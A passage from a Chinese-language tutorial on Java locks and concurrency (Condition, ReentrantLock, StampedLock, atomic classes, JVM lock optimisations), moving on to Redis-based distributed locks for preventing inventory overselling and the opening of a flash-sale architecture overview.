&#125;&#125;\n\n在使用Condition接口时，不会直接创建Condition接口的对象，而是通过Lock接口的newCondition()方法创建。调用Lock锁对象的newCondition()方法就能够生成与当前Lock锁绑定的Condition对象，然后使用Condition对象就可以实现线程的等待与通知机制。\n使用示例：\npublic class ConditionTask implements Runnable &#123;    private Lock lock;    private Condition condition;    public ConditionTask(Lock lock, Condition condition) &#123;        this.lock = lock;        this.condition = condition;    &#125;    @Override    public void run() &#123;        lock.lock();        try &#123;            System.out.println(&quot;线程进入等待&quot;);            condition.await();            System.out.println(&quot;线程被唤醒&quot;);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125; finally &#123;            lock.unlock();        &#125;    &#125;&#125;\n\npublic class ConditionTest &#123;    public static void main(String[] args) throws InterruptedException &#123;        Lock lock = new ReentrantLock();        Condition condition = lock.newCondition();        new Thread(new ConditionTask(lock, condition)).start();        Thread.sleep(1000);        //主线程获取锁        lock.lock();        try &#123;            System.out.println(&quot;唤醒等待的线程&quot;);            condition.signal();            Thread.sleep(1000);            System.out.println(&quot;唤醒等待的线程结束&quot;);        &#125; finally &#123;            lock.unlock();        &#125;    &#125;&#125;/**线程进入等待唤醒等待的线程唤醒等待的线程结束线程被唤醒*/\n\n在这个例子中，创建了一个执行condition.await()进入等待状态的线程，使用主线程执行condition.signal()唤醒等待的线程，主线程释放锁后进入等待状态的线程成功地被唤醒。\nReentrantLockReentrantLock是Java提供的一种可重入锁，一个线程可以多次通过ReentrantLock的lock()方法获取锁，所以要完全释放锁，必须要调用相同次数的unlock()释放锁的方法。底层的实现是，每获取一次锁，计数器就会加1，当线程释放锁时，重入的计数就会减少1。只有当重入的计数变为0时，锁才会真正被释放。\nReentrantLock支持公平和非公平两种模式。底层是ReentrantLock通过内部的两个抽象类，FairSync和NonfairSync，实现的。FairSync和NonfairSync分别表示公平锁和非公平锁模式，两者都继承了Sync类，而Sync类继承了AQS，所以ReentrantLock是基于AQS实现的。\n使用示例：\npublic class ReentrantLockTask implements Runnable &#123;    private Lock lock;    public ReentrantLockTask(Lock lock) &#123;        this.lock = lock;    &#125;    @Override    public void run() &#123;        lock.lock();        String threadName = Thread.currentThread().getName();        System.out.println(threadName + &quot;线程第一次加锁&quot;);        lock.lock();        System.out.println(threadName + &quot;线程第二次加锁&quot;);        try &#123;            System.out.println(threadName + &quot;线程使用临界区资源&quot;);        &#125; finally &#123;            System.out.println(threadName + &quot;线程第一次解锁&quot;);            lock.unlock();            System.out.println(threadName + &quot;线程第二次解锁&quot;);            lock.unlock();        &#125;    &#125;&#125;\n\npublic class ReentrantLockTest &#123;    public static void main(String[] args) &#123;        ReentrantLock lock = new ReentrantLock();        IntStream.range(0, 2).forEach((i) -&gt; &#123;            new Thread(new ReentrantLockTask(lock)).start();        &#125;);    &#125;&#125;/**Thread-0线程第一次加锁Thread-0线程第二次加锁Thread-0线程使用临界区资源Thread-0线程第一次解锁Thread-0线程第二次解锁Thread-1线程第一次加锁Thread-1线程第二次加锁Thread-1线程使用临界区资源Thread-1线程第一次解锁Thread-1线程第二次解锁*/\n\n在这个例子中，在ReentrantLockTask的run方法中演示了ReentrantLock的锁重入的使用方法。\nReadWriteLock接口ReadWriteLock是Java提供的一种读写锁，ReadWriteLock锁声明了两个方法，分别用于获取读锁和写锁。\n读写锁：\n\n共享锁（读锁）：读共享\n排他锁（写锁）：写互斥\n\nReentrantReadWriteLockReentrantReadWriteLock是从Java1.5开始提供的ReadWriteLock的实现类。使用ReentrantReadWriteLock对象可以获取读锁和写锁。\nReentrantReadWriteLock也支持公平锁和非公平锁，底层也是通过ReentrantReadWriteLock内部的两个抽象类两个抽象类FairSync和NonfairSync实现的，所以也是基于AQS实现的。\nReentrantReadWriteLock内部还定义了两个读写类，分别是ReadLock和WriteLock。\nReentrantReadWriteLock支持锁降级，即获取写锁的线程可以获取读锁，锁降级后锁的级别会从写锁降为读锁。\n使用示例：\npublic class ReadWriteLockTest &#123;    private ReadWriteLock readWriteLock = new ReentrantReadWriteLock();    private Lock readLock = readWriteLock.readLock();    private Lock writeLock = readWriteLock.writeLock();    public void read() &#123;        readLock.lock();        try &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程获取到读锁&quot;);            Thread.sleep(500);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125; finally &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程释放读锁&quot;);            readLock.unlock();        &#125;    &#125;    public void write() &#123;        writeLock.lock();        try &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程获取到写锁&quot;);            Thread.sleep(500);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125; finally &#123;            System.out.println(Thread.currentThread().getName() + &quot;线程释放写锁&quot;);            writeLock.unlock();        &#125;    &#125;    public static void main(String[] args) throws InterruptedException &#123;        ReadWriteLockTest readWriteLockTest = new ReadWriteLockTest();        IntStream.range(0, 3).forEach((i) -&gt; &#123;            new Thread(readWriteLockTest::read).start();        &#125;);        Thread.sleep(1000);        IntStream.range(0, 3).forEach((i) -&gt; &#123;            new Thread(readWriteLockTest::write).start();        &#125;);    &#125;&#125;/**输出结果：Thread-0线程获取到读锁Thread-1线程获取到读锁Thread-2线程获取到读锁Thread-0线程释放读锁Thread-1线程释放读锁Thread-2线程释放读锁Thread-3线程获取到写锁Thread-3线程释放写锁Thread-5线程获取到写锁Thread-5线程释放写锁Thread-4线程获取到写锁Thread-4线程释放写锁*/\n\n在这个例子中，创建了一个ReentrantReadWriteLock类的对象，并由这个对象获取到读锁跟写锁，分别开启多个使用读锁的线程和使用写锁的线程，可以看到看到读锁同一时刻可以被多个线程获取，验证了ReentrantReadWriteLock的读锁是共享的，可以看到写锁同一时刻只能被一个线程获取，线程释放写锁后其它线程才有机会获取，验证了ReentrantReadWriteLock的写锁是互斥的。\nStampedLockStampedLock是从Java1.8开始提供的读写锁，支持读锁（悲观读）、写锁、乐观读（OptimisticRead）。只支持非公平锁。不支持重入。支持锁的升级和降级。\nStampedLock在获取读锁和写锁成功后都会返回一个Long型的返回值，在释放锁时需要传入这个返回值。\nStampedLock的乐观读：乐观读不加锁，使用乐观读期间允许获取写锁并执行写入操作，在读取之前会获取数据的版本号，读取完成后，通过validate()方法去验证版本号，如果版本号不变，则说明在读取过程中没有发生数据修改，否则说明发生了数据修改，就需要将乐观读升级为悲观读。\n使用示例：\npublic class StampedLockTest &#123;    //共享变量（临界区资源）    private int count = 0;    //StampedLock锁    private final StampedLock stampedLock = new StampedLock();    public void write() &#123;        long stamp = stampedLock.writeLock();        System.out.println(Thread.currentThread().getName() + &quot;写线程修改共享变量的值开始&quot;);        try &#123;            count += 1;        &#125; finally &#123;            stampedLock.unlockWrite(stamp);        &#125;        System.out.println(Thread.currentThread().getName() + &quot;写线程修改共享变量的值结束&quot;);    &#125;    public void optimisticRead() &#123;        long stamp = stampedLock.tryOptimisticRead();        System.out.println(Thread.currentThread().getName() + &quot;检测共享变量是否被修改（没有被修改为true，被修改为false）：&quot; + stampedLock.validate(stamp));        try &#123;            TimeUnit.SECONDS.sleep(2);        &#125; catch (InterruptedException e) &#123;            throw new RuntimeException(e);        &#125;        System.out.println(Thread.currentThread().getName() + &quot;线程休眠两秒后再次检测共享变量的值是否被修改（没有被修改为true，被修改为false）：&quot; + stampedLock.validate(stamp));        int result = count;        if (!stampedLock.validate(stamp)) &#123;            System.out.println(&quot;共享变量的值被修改，说明乐观读期间也允许获取写锁&quot;);            //将乐观锁升级为悲观锁            stamp = stampedLock.readLock();            try &#123;                System.out.println(Thread.currentThread().getName() + &quot;线程将乐观读升级为悲观读&quot;);                result = count;                System.out.println(Thread.currentThread().getName() + &quot;线程从乐观读升级为悲观读后的共享变量的值：&quot; + result);            &#125; finally &#123;                stampedLock.unlockRead(stamp);            &#125;        &#125;        System.out.println(Thread.currentThread().getName() + &quot;线程读取到的最终的共享变量的值：&quot; + result);    &#125;    public static void main(String[] args) throws InterruptedException &#123;        StampedLockTest stampedLockTest = new StampedLockTest();        new Thread(stampedLockTest::optimisticRead).start();        TimeUnit.SECONDS.sleep(1);        System.out.println(&quot;一秒后启动写线程&quot;);        new Thread(stampedLockTest::write).start();    &#125;&#125;/**Thread-0检测共享变量是否被修改（没有被修改为true，被修改为false）：true一秒后启动写线程Thread-1写线程修改共享变量的值开始Thread-1写线程修改共享变量的值结束Thread-0线程休眠两秒后再次检测共享变量的值是否被修改（没有被修改为true，被修改为false）：false共享变量的值被修改，说明乐观读期间也允许获取写锁Thread-0线程将乐观读升级为悲观读Thread-0线程从乐观读升级为悲观读后的共享变量的值：1Thread-0线程读取到的最终的共享变量的值：1*/\n\n在这个例子中，使用validate方法检测变量是否被修改，首先启动了乐观读线程，一秒后启动写线程，启动写线程后虽然乐观读线程没有退出，但是再次读取时可以检测到变量值被改变，说明乐观读期间也允许获取写锁。使用乐观读时如果检测到变量值修改了，就需要将乐观读升级为悲观读。\n无锁原子类无锁原子类全部位于util.concurrent.atomic包下：\n\n\n基本类型原子类\n包括：AtomicInteger、AtomicLong、AtomicBoolean。\n基本类型的原子类只能操作Java的基本类型数据，并且只能更新单个基本类型的变量。\n\n引用类型原子类\n包括：AtomicReference、AtomicStampedReference、AtomicMarkableReference。\n这些引用类型原子类都是使用了泛型。\n如果要同时操作多个变量，或者更新一个对象的多个属性，就需要使用引用类型原子类。\n其中，AtomicReference是最基础的引用类型原子类，AtomicStampedReference是带有stamp戳记的引用原子类，AtomicMarkableReference是带有mark标志的引用原子类。\n\n字段类型原子类\n包括：AtomicIntegerFieldUpdater、AtomicLongFieldUpdater、AtomicReferenceFieldUpdater。\n如果只是想更新对象中的某个字段，则可以使用Java中专门操作字段类型的原子类。\n使用字段类型原子类时，需要先调用各自类的newUpdater()方法来指定要更新的类和字段名称，如果使用的是AtomicReferenceFieldUpdater还需要指定字段的类型。\n使用操作字段类型的原子类更新某个类中的字段时，部分类型的变量下不能实现原子性地更新：\n\n类的静态变量\n父类的成员变量\n不能被直接访问类的成员变量\n被final关键字修饰类的成员变量\n没有使用volatile关键字修饰的类的成员变量\n\n\n数组类型原子类\n包括：AtomicIntegerArray、AtomicLongArray、AtomicReferenceArray。\n\n累加器类型原子类\n包括：DoubleAccumulator、DoubleAddr、LongAccumulator、LongAddr。\n优化原理：为减少大量线程竞争资源，进行CAS更新变量时大量失败的现象，Java1.8中提供了累加器类型原子类，通过将一个变量分解为多个变量，让多个线程竞争同一资源的情况转变为多个线程竞争多个资源，提升了性能。\nXxxAccumulator的功能比XxxAddr多，表现在：\n\nXxxAccumulator的初始值可以自定义\nXxxAccumulator的运算规则可以自定义\n\n累加器类型原子类的变量更新机制：使用累加器类型原子类更新变量时会维护一个Cell类型的数组，每个Cell类型的元素内部会维护一个double类型或者long类型的变量，初始值为0，线程会竞争数组中多个Cell类型的元素（如果一个线程竞争某个元素失败，不会在该元素上进行CAS自旋，而是会尝试对其它元素进行CAS操作）。在获取累加器类型原子类的变量值时，会将Cell数组中的所有元素的value值进行累加，再加上base变量的值后得到结果并返回。\n在Cell类的定义上有@jdk.internal.vm.annotation.Contended注解，解决伪共享问题，提高性能。\n\n@jdk.internal.vm.annotation.Contended 是 Java 中的一个注解，它的作用是用于解决伪共享（False Sharing）的问题。\n伪共享是指多个线程同时访问不同的变量，但这些变量位于同一缓存行中。由于缓存行是处理器缓存的最小单位，当一个线程修改了缓存行中的一个变量，该缓存行会被标记为”脏”，其他线程在访问同一缓存行中的其他变量时，需要将该缓存行从其他处理器的缓存中读取到自己的缓存中，这个过程称为”缓存行的失效”（Cache Line Invalidation）。这种失效操作会导致性能下降，尤其在多核处理器中更为明显。\n@jdk.internal.vm.annotation.Contended 注解的作用就是通过在变量之间添加填充（Padding）来解决伪共享的问题。填充是在变量之间插入一些无意义的字段，使得它们位于不同的缓存行中，从而避免了伪共享导致的性能下降。\n\n\n\n锁核心原理隐式锁和显示锁synchronized是隐式锁，Lock等是显示锁\n\n当调用synchronized修饰的代码时，并不需要显示的加锁和解锁的过程，所以称之为隐式锁\n而Lock锁都是手动写代码去获取锁和释放锁的，所以也叫显示锁\n\n公平锁和非公平锁的原理公平锁中的线程在抢占锁时首先会判断等待队列是否为空，如果队列为空或者当前线程是队列的队首元素，则当前线程获取到锁资源，否则会被放入队列尾部等待获取锁\n非公平锁中的线程在抢占锁时会先直接尝试抢占锁，如果抢占成功就继续执行程序的业务逻辑，如果抢占失败，才会进入等待队列中等待\nReentrantLock支持公平锁和非公平锁，在使用时公平锁和非公平锁的用法一样：\n// 创建公平锁实例Lock lock = new ReentrantLock(true); // 创建公平锁// Lock lock = new ReentrantLock(false); // 创建非公平锁// Lock lock = new ReentrantLock(); // 创建非公平锁try &#123;\tlock.lock();&#125; finally &#123;\tlock.unlock();&#125;\n\n悲观锁和乐观锁的原理悲观锁的核心思想是对数据是否被修改持有悲观态度，认为其他线程会修改数据，所以在线程每次获取数据时都会加锁。\n乐观锁的核心思想是对数据是否被修改持有乐观态度，认为其他线程不会修改数据，所以在线程每次获取数据时都不会加锁。乐观锁适合读多写少的场景。\nsynchronized锁就是悲观锁\njava.util.concurrent.atomic包下的原子类就是乐观锁\nAtomicInteger类的用法示例：\nAtomicInteger atomicInteger = new AtomicInteger(); //创建原子类atomicInteger.incrementAndGet(); //加1int num = atomicInteger.get(); // get值\n\n可中断锁和不可中断锁的原理可中断锁指在多个线程抢占的过程中可以被中断的锁。\n不可中断锁指在多个线程抢占的过程中不可以被中断的锁。\nReentrantLock，就是可中断锁，ReentrantLock支持两种可中断锁的使用方式，lockInterruptibly()和tryLock(long timeout, TimeUnit unit)，如果当前线程在抢占锁的过程中被中断，就会抛出InterruptedException()用法示例：\ntry &#123;\tlock.lockInterruptibly();&#125; catch (InterruptedException) &#123;\t// 抢占锁被中断&#125; finally &#123;\tlock.unlock();&#125;\n\nsynchronized锁是不可中断锁，只能在抢占锁成功后被中断，不能在抢占锁的过程中被中断。\n独占锁和共享锁的原理按照加锁后的资源能否在被多个线程访问，可以将锁分为独占锁和共享锁\n线程获取到独占锁后，其他线程如果想要获取该锁，只能等待。\n线程获取到共享锁后，其他线程也可以获取到该锁，但是共享锁只允许对临界区的数据进行读取操作，不允许修改。也就是说，共享锁是针对读操作的锁。\nsynchronized锁、ReentrantLock锁、ReentrantReadWriteLock的写锁都是独占锁。\nReentrantReadWriteLock的读锁、Semaphore类、CountDownLatch类都是共享锁。\nLockSupport原理LockSupport位于java.util.concurrent.locks包，是Java提供的创建锁和其他多线程工具的基础类库，主要作用就是阻塞和唤醒线程，底层是基于UnSafe类实现的。AQS 底层就是使用了LockSupport来实现线程的阻塞和唤醒。\nLockSupport类提供的核心方法：\n\n\n\n\n\n方法\n功能\n\n\n\npublic static void park()\n阻塞当前线程\n\n\npublic static void park(Object blocker)\n使用指定的 blocker（锁对象）阻塞当前线程\n\n\npublic static void parkNanos(long nanos)\n阻塞当前线程，并指定了最长阻塞的时间，单位是纳秒\n\n\npublic static void parkUntil(long deadline)\n阻塞当前线程，并指定了deadline时间点\n\n\npublic static void parkNanos(Object blocker, long nanos)\n阻塞当前线程，并指定了使用的 blocker（锁对象）、最长阻塞的时间，单位是纳秒\n\n\npublic static void parkUntil(Object blocker, long deadline)\n阻塞当前线程，并指定了使用的 blocker（锁对象）、deadline时间点\n\n\npublic static void unpark(Thread thread)\n解除指定已被park的线程的阻塞状态；如果线程已经启动但还未park，就取消下一次的park。\n\n\n在底层实现上，LockSupport使用了一种名为”许可（Permit）”的概念来控制阻塞和唤醒。Permit的数量最多为1。\n如果线程已经拿到了Permit，则调用LockSupport.park()会立即返回；如果没有拿到Permit，park()方法会阻塞线程。调用LockSupport.unpark(Thread)方法会给指定的线程发放Permit。\nunpark()可以先于park()调用：如果 unpark(thread) 在 park() 之前被调用，那么线程会获得一个Permit，当后续 park() 被调用时，线程可以立即消费掉这个Permit并继续执行，而不会阻塞。\n如果调用者的线程被中断，park 将返回。\n下面是一个简单的LockSupport使用例子：\npublic class LockSupportExample &#123;    public static void main(String[] args) &#123;        Thread thread = new Thread(() -&gt; &#123;            System.out.println(&quot;Child thread begin park!&quot;);            // 调用park方法，挂起自己            LockSupport.park();            System.out.println(&quot;Child thread end park!&quot;);        &#125;);        thread.start();        // 主线程延迟2s        try &#123;            Thread.sleep(2000);        &#125; catch (InterruptedException e) &#123;            e.printStackTrace();        &#125;        System.out.println(&quot;Main thread begin unpark!&quot;);        // 调用unpark方法让thread线程持有许可证，然后park方法返回        LockSupport.unpark(thread);    &#125;&#125;\n\n在这个例子中，子线程通过调用LockSupport.park()方法阻塞自己，主线程在延迟2秒后调用LockSupport.unpark(thread)方法唤醒子线程。\n锁优化方案减小锁的范围缩小锁的范围就是缩短持有锁的时间，减轻阻塞。\n最简单的做法是将一些不会产生线程安全问题的代码移到同步代码块之外，比如把不会产生线程安全问题的I&#x2F;O类耗时的操作，放在同步代码块之外。\n减小锁的粒度减小锁的粒度就是缩小锁定对象的范围，就能够减少锁的竞争。\n做法是把对大对象的加锁转换为对小对象的加锁，比如一个类中的多个方法都是对this加锁，按照减小锁粒度的思路就可以转换为只对每个方法中用到的临界区对象加锁。\n锁分离锁分离就是把锁拆分为读锁和写锁，规则是读读不互斥、读写和写写互斥\n锁分离最典型的应用是ReadWriteLock（读&#x2F;写锁）\n锁分段锁分段就是对一组对象上的锁进行分解，以减小锁的粒度。\n锁分段的典型应用是ConcurrentHashMap，ConcurrentHashMap将数据按照不同的数据段进行存储（使用了一个包含16个锁的数组），并为每一个数据段分配一把锁（第N个数据交给第N%16把锁保护）。\n避免热点区域避免热点区域是对热点区域（经常被访问的临界区）进行优化。\n避免热点区域典型的应用是ConcurrentHashMap的size，ConcurrentHashMap会给每个数据段分别维护size，而不是共用一个size，这些size由所在数据段的锁来维护，减小了size改变的竞争频率，要统计size长度时，会累加数据段的size。\n使用独占锁的替换方案要保证线程安全，还可以根据需要使用下面的方案替换独占锁：\n\n并发容器\n读&#x2F;写锁\n乐观锁（如使用了CAS操作的原子类）\nfinal关键字修饰的不可变对象（final修饰的的变量是不可变的，不存在线程安全问题）\n\nJVM自带的锁优化锁消除锁消除的前提的JVM开启了逃逸分析，如果JVM通过逃逸分析发现对象只能被一个线程访问到，就可以不对这个对象加锁。即便程序中使用了同步锁，JVM也会将锁消除。\nJVM参数：\n\n开启逃逸分析：-XX:+DoEscapeAnalysis\n开启同步锁消除：-XX:+EliminateLocks\n\n如下代码，尽管StringBuffer的append()是被synchronized修饰的，但是不存在线程竞争，JVM会进行锁消除。\npublic String method()&#123;    StringBuffer sb = new StringBuffer();    sb.append(&quot;1&quot;);//append()是被synchronized修饰的    sb.append(&quot;2&quot;);    return sb.toString();&#125;\n\n锁粗化由于锁的竞争和释放开销比较大，如果代码中对锁进行了频繁的竞争和释放，那么JVM会进行优化，将锁的范围适当扩大。\n如下代码，在循环内使用synchronized，JVM锁粗化后，会将锁范围扩大到循环外。\npublic void method()&#123;    for (int i= 0; i &lt; 100; i++) &#123;        synchronized (this)&#123;            ...        &#125;    &#125;&#125;\n\n粗化后：\npublic void method()&#123;    synchronized (this)&#123;        for (int i= 0; i &lt; 100; i++) &#123;      \t\t...          \t&#125;    &#125;&#125;\n\n虽然JVM内部会进行优化，但是最好还是在代码里就优化了。\n分布式锁架构超卖问题超卖问题的意思是系统售出的商品数量超出库存量，产生原因是多个线程同时拿到了同一商品的相同库存量，对同一商品的相同库存量进行了多次扣减。\n下面给出模拟超卖问题的示例。\n\n使用SpringBoot和Redis搭建的会产生超卖问题的程序：\n\n@RestController@RequestMapping(&quot;/order/v1&quot;)public class OverSoldV1 &#123;    private static final String PRODUCT_ID = &quot;1001&quot;;    String STOCK_COUNT = &quot;100&quot;;    private final Logger logger = Logger.getLogger(String.valueOf(OverSold.class));    private final StringRedisTemplate stringRedisTemplate;    public OverSold(StringRedisTemplate stringRedisTemplate) &#123;        this.stringRedisTemplate = stringRedisTemplate;        stringRedisTemplate.opsForValue().set(PRODUCT_ID, STOCK_COUNT);    &#125;    @RequestMapping(&quot;/submitOrder&quot;)    public String submitOrder() &#123;                String stockString = stringRedisTemplate.opsForValue().get(PRODUCT_ID);        if (stockString == null || &quot;&quot;.equals(stockString.trim())) &#123;            logger.info(&quot;库存不足，扣减失败&quot;);            throw new RuntimeException(&quot;库存不足，扣减失败&quot;);        &#125;        int stock = Integer.parseInt(stockString);        if (stock &gt; 0) &#123;            stock -= 1;            stringRedisTemplate.opsForValue().set(PRODUCT_ID, String.valueOf(stock));            String info = &quot;库存扣减成功，当前库存为：&quot; + stock;            logger.info(info);        &#125; else &#123;            logger.info(&quot;库存不足，扣减失败&quot;);            throw new RuntimeException(&quot;库存不足，扣减失败&quot;);        &#125;        return &quot;success&quot;;    &#125;&#125;\n\n\n使用JMeter对接口进行并发测试，设置线程数为5，Ramp-up period是0，即5个线程会同时访问\n\n运行JMeter测试任务，得到输出结果，可以看到存在对同一商品的相同库存进行了多次扣减的问题，即超卖问题。\n\n\n\n分布式锁分布式锁的实现方式Java提供的锁机制都是JVM级别的，只在JVM进程内部有效。但是不能解决分布式场景下的高并发问题，要解决分布式环境下的高并发问题，需要使用分布式锁。\n实现分布式锁可以参照JVM锁的实现方式，JVM中多个线程在访问临界区资源时，会到统一的地方检查程序的临界区是否已经加锁，JVM在统一的地方使用加锁状态来标记是否进行了加锁操作，这个统一的地方可以是保存加锁状态的服务。\n分布式锁的实现方法和JVM锁的实现方法类似，只是在实现JVM锁时，是将锁的状态保存在Java对象头中，而实现分布式锁时，是将锁的状态保存在一个外部服务中，这个外部服务可以使用数据库（如MySQL）、Redis、Zookeeper等数据存储服务实现。\n具体实现方式：\n\n基于数据库的锁：这种方式通常是在数据库中创建一张锁表，需要获取锁的时候在这张表中插入一条记录，释放锁的时候则删除这条记录。这种方式实现简单，但是性能可能会受到影响。\n\n基于Redis的锁：Redis提供了一些原子性的操作，比如SETNX，set if not exist， 可以利用这些特性来实现分布式锁。SETNX命令可以在键不存在的情况下设置键值对，如果键已经存在，则不做任何操作。这种方式性能较好，但是需要处理好锁的超时和续期问题。\n\n基于Zookeeper的锁：Zookeeper提供了一种叫做顺序临时节点的机制，可以利用这个机制来实现分布式锁。要获取锁的线程创建一个临时节点，如果这个节点是所有节点中序号最小的，那么就认为这个线程获取了锁。这种方式性能较差，但是更加可靠，适合对一致性要求更高的场景。\n\n\n分布式锁的基本要求要实现一个分布式锁，需要满足以下要求：\n\n支持互斥性：支持多个线程操作同一共享变量的互斥性。\n支持阻塞与非阻塞：当线程获取分布式锁失败，分布式锁能够支持当前线程是阻塞或者非阻塞的特性。\n支持可重入性：分布式锁能够支持同一线程同时多次获取同一个分布式锁的特性。\n支持锁超时：为避免获取到分布式锁的线程意外退出，进而无法正常释放锁，导致其它线程无法正常获取到锁的情况，分布式锁需要支持超时机制，若加锁时长超过一定时间，锁就会自动释放。\n\nCAP理论与分布式锁模型CAP理论是分布式领域非常著名的理论，CAP理论由C、A、P三部分组成，每个字母的含义如下：\n\nC（Consistency）：一致性，表示在分布式环境下，所有节点在任意时刻都具有相同的数据。\nA（Availability）：可用性，表示在分布式环境下，每个请求都能得到响应，但是不能保证能够获取到最新的数据。\nP（Partition Tolerance）：分区容错性，表示在分布式环境下，当系统中的某个分区发生故障或通信中断时，其他分区可以继续运行，保持整个系统的正常工作。\n\n同时，CAP理论指出，在分布式环境下，不可能同时保证一致性、可用性和分区容错性，最多只能保证其中的两个特性。\n在分布式系统中，必须保证分区容错性。\n基于CAP理论可以进行分布式锁模型的设计，例如：\n\n基于Redis的AP架构模型\nRedis先返回请求结果，再以异步的方式同步数据\n\n基于Zookeeper的CP架构模型\n当数据在大多数Zookeeper节点间同步完成后，才返回请求结果\n\n\n基于Redis实现分布式锁在超卖问题的示例代码的基础上，进行优化得到可以确保如下条件的分布式锁：\n\n不会出现超卖\n使用Redis的SETNX命令，该命令的返回结果是：\n\n1：Redis中不存在当前key，设置键值对成功\n0：Redis中存在当前key，设置键值对失败\n\n使用该命令对应的函数存储当前获取锁的线程id，以是否返回1作为是否获取到锁的判断条件，可以确保每次只有一个线程获取到锁\n同时为了保证可重入性，在每次获取锁之前先判断是否是自己持有的锁\n\n不会因为线程异常退出导致锁无法释放\n解决方法是\n\n引入try finally块\n引入超时机制，为避免获取到锁之后没有执行设置超时机制，需要和SETNX命令共同以原子化的方式使用\n\n\n\n修改后的代码：\n@RestController@RequestMapping(&quot;/order/v2&quot;)public class OverSoldV2 &#123;    private static final String PRODUCT_ID = &quot;1001&quot;;    private static final String THREAD_ID = &quot;THREAD_ID&quot;;    String STOCK_COUNT = &quot;100&quot;;    private final Logger logger = Logger.getLogger(String.valueOf(OverSoldV2.class));    private final StringRedisTemplate stringRedisTemplate;    public OverSoldV2(StringRedisTemplate stringRedisTemplate) &#123;        this.stringRedisTemplate = stringRedisTemplate;        stringRedisTemplate.opsForValue().set(PRODUCT_ID, STOCK_COUNT);    &#125;    @RequestMapping(&quot;/submitOrder&quot;)    public String submitOrder() &#123;        String threadId = String.valueOf(Thread.currentThread().getId());        Boolean isLocked = stringRedisTemplate.opsForValue().setIfAbsent(THREAD_ID, threadId, 30, TimeUnit.SECONDS);        if (Boolean.FALSE.equals(isLocked)) &#123;            return &quot;failure&quot;;        &#125;        try &#123;            String stockString = stringRedisTemplate.opsForValue().get(PRODUCT_ID);            if (stockString == null || &quot;&quot;.equals(stockString.trim())) &#123;                logger.info(&quot;库存不足，扣减失败&quot;);                throw new RuntimeException(&quot;库存不足，扣减失败&quot;);            &#125;            int stock = Integer.parseInt(stockString);            if (stock &gt; 0) &#123;                stock -= 1;                stringRedisTemplate.opsForValue().set(PRODUCT_ID, String.valueOf(stock));                String info = &quot;库存扣减成功，当前库存为：&quot; + stock;                logger.info(info);            &#125; else &#123;                logger.info(&quot;库存不足，扣减失败&quot;);                throw new RuntimeException(&quot;库存不足，扣减失败&quot;);            &#125;        &#125; finally &#123;            stringRedisTemplate.delete(THREAD_ID);        &#125;        return &quot;success&quot;;    &#125;&#125;\n\n运行JMeter测试任务，得到输出结果，可以看到不再发生对库存重复扣减，超卖问题被解决。\n\n虽然超卖问题已经解决，但是每次获取锁失败就直接返回，没有实现锁的阻塞性，要实现锁的阻塞性，一种简单的实现方式是使用自旋：\n@RestController@RequestMapping(&quot;/order/v3&quot;)public class OverSoldV3 &#123;    private static final String PRODUCT_ID = &quot;1001&quot;;    private static final String THREAD_ID = &quot;THREAD_ID&quot;;    String STOCK_COUNT = &quot;100&quot;;    private final Logger logger = Logger.getLogger(String.valueOf(OverSoldV3.class));    private final StringRedisTemplate stringRedisTemplate;    public OverSoldV3(StringRedisTemplate stringRedisTemplate) &#123;        this.stringRedisTemplate = stringRedisTemplate;        stringRedisTemplate.opsForValue().set(PRODUCT_ID, STOCK_COUNT);    &#125;    @RequestMapping(&quot;/submitOrder&quot;)    public String submitOrder() &#123;        String threadId = String.valueOf(Thread.currentThread().getId());        Boolean isLocked = stringRedisTemplate.opsForValue().setIfAbsent(THREAD_ID, threadId, 30, TimeUnit.SECONDS);        if (Boolean.FALSE.equals(isLocked)) &#123;            do &#123;                isLocked = stringRedisTemplate.opsForValue().setIfAbsent(THREAD_ID, threadId, 30, TimeUnit.SECONDS);            &#125; while (Boolean.FALSE.equals(isLocked));        &#125;        try &#123;            String stockString = stringRedisTemplate.opsForValue().get(PRODUCT_ID);            if (stockString == null || &quot;&quot;.equals(stockString.trim())) &#123;                logger.info(&quot;库存不足，扣减失败&quot;);                throw new RuntimeException(&quot;库存不足，扣减失败&quot;);            &#125;            int stock = Integer.parseInt(stockString);            if (stock &gt; 0) &#123;                stock -= 1;                stringRedisTemplate.opsForValue().set(PRODUCT_ID, String.valueOf(stock));                String info = &quot;库存扣减成功，当前库存为：&quot; + stock;                logger.info(info);            &#125; else &#123;                logger.info(&quot;库存不足，扣减失败&quot;);                throw new RuntimeException(&quot;库存不足，扣减失败&quot;);            &#125;        &#125; finally &#123;            stringRedisTemplate.delete(THREAD_ID);        &#125;        return &quot;success&quot;;    &#125;&#125;\n\n使用阻塞等待后，调整JMeter的请求数等于商品数（100），如果恰好消费完，说明锁的阻塞等待是有效的。\nJMeter的线程参数配置如下图，开启了5个线程，每个线程循环20次，请求次数总共100次：\n\n运行JMeter测试任务，输出结果显示如下图：\n\n输出结果显示，确实是恰好消费完，说明锁的阻塞等待是有效的。\n秒杀系统架构电商系统架构一个简化的电商系统架构由上到下分为客户端、网关层、负载均衡层、应用层和存储层。各层包含的应用和服务举例如下：\n\n客户端：PC网页端、APP、H5网页端、小程序。\n网关层：系统网关，包括硬件网关和软件网关。\n负载均衡层：Nginx等负载均衡服务器\n应用层：涵盖接入服务和基础服务等\n接入服务：商品接入服务、会员接入服务、订单接入服务、收银接入服务、物流接入服务等\n基础服务：商品服务、用户服务、订单服务、库存服务、价格服务、物流服务等\n\n\n存储层：数据库集群、缓存集群、ElastichSearch集群等\n\n各层的并发度估计：\n\n假设负载均衡层使用的是Nginx，Nginx的最大并发度大于10万，数量级是万\n假设应用层使用的是Tomcat，Tomcat的最大并发度8百左右，数量级是百\n假设存储层的缓存使用的是Redis，Redis的最大并发度5万左右，数量级是万\n假设存储层的数据库使用的是MySQL，MySQL的最大并发度1千左右，数量级是千\n\n在设计系统架构时需要综合考虑系统各层的最大并发度和数量级。\n其中，\n在 Redis 缓存层面可以采用主从复制、集群模式等技术来提高数据读写的并发度和可靠性，同时合理选择缓存策略，避免缓存雪崩和缓存穿透等问题。\n在 MySQL 数据库层面可以采用水平分库分表、索引优化、SQL 